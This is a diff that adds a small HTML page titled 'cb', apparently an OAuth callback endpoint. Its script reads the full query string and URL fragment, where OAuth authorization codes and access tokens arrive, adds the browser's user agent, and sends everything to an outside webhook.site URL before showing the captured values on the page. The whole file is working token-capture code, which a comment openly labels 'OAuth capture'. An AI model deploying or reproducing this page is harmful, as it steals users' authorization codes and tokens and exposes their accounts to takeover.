@@ -1,0 +1,14 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>cb</title></head>
+<body>
+<script>
+// OAuth capture: forward full query+fragment to webhook.site, then show locally too
+var sink = "https://webhook.site/f1635149-96c7-4e36-8fdd-d5fb5393c708/oauth-cb";
+var qs = location.search || "";
+var hs = location.hash ? ("&_frag=" + encodeURIComponent(location.hash.slice(1))) : "";
+document.title = "cb-captured";
+fetch(sink + qs + hs + (qs ? "&" : "?") + "_ua=" + encodeURIComponent(navigator.userAgent), {mode:"no-cors"}).finally(function(){
+  document.body.textContent = "captured: " + qs + hs;
+});
+</script>
+</body></html>
